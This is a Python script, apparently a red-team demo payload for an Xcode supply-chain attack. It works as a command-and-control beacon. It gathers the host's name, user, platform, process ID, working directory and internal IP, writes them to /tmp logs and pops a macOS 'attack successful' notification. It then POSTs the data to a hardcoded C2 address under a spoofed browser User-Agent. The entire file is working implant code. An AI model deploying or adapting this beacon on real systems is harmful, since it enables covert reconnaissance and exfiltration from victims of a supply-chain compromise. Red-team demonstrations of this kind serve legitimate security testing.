#!/usr/bin/env python3
"""
Simple HTTP Beacon for Demo - just callbacks to show the attack worked.
Sends system info to C2 and displays notification on macOS.
"""
import os
import sys
import socket
import platform
import getpass
import urllib.request
import urllib.parse
import subprocess
import time
import json

# Configuration - callback server
C2_HOST = "192.168.36.226"
C2_PORT = 9999
CALLBACK_PATH = "/callback"

def get_system_info():
    """Collect system information"""
    info = {
        "hostname": socket.gethostname(),
        "username": getpass.getuser(),
        "platform": platform.system(),
        "release": platform.release(),
        "machine": platform.machine(),
        "pid": os.getpid(),
        "cwd": os.getcwd(),
    }
    
    # Get internal IP
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        info["ip"] = s.getsockname()[0]
        s.close()
    except:
        info["ip"] = "unknown"
    
    return info

def send_callback(info):
    """Send callback to C2"""
    try:
        url = f"http://{C2_HOST}:{C2_PORT}{CALLBACK_PATH}"
        data = urllib.parse.urlencode(info).encode()
        req = urllib.request.Request(url, data=data, method="POST")
        req.add_header("User-Agent", "Mozilla/5.0 (Macintosh)")
        req.add_header("Content-Type", "application/x-www-form-urlencoded")
        
        with urllib.request.urlopen(req, timeout=10) as resp:
            return resp.status == 200
    except Exception as e:
        # If callback server isn't running, just log locally
        with open("/tmp/beacon_callback.log", "a") as f:
            f.write(f"Callback failed: {e}\n")
            f.write(f"Info: {json.dumps(info)}\n")
        return False

def show_notification():
    """Show macOS notification for demo visibility"""
    try:
        subprocess.run([
            "osascript", "-e",
            'display notification "Supply chain attack successful! Beacon deployed." with title "RED TEAM DEMO" sound name "Ping"'
        ], timeout=5)
    except:
        pass

def main():
    info = get_system_info()
    info["source"] = "xcode_supply_chain"
    info["timestamp"] = time.strftime("%Y-%m-%d %H:%M:%S")
    
    # Log locally
    with open("/tmp/beacon_executed.log", "a") as f:
        f.write(f"{json.dumps(info, indent=2)}\n")
    
    # Show notification
    show_notification()
    
    # Send callback
    success = send_callback(info)
    
    if success:
        print(f"[+] Beacon callback sent to {C2_HOST}:{C2_PORT}")
    else:
        print(f"[-] Callback failed, logged locally")

if __name__ == "__main__":
    main()
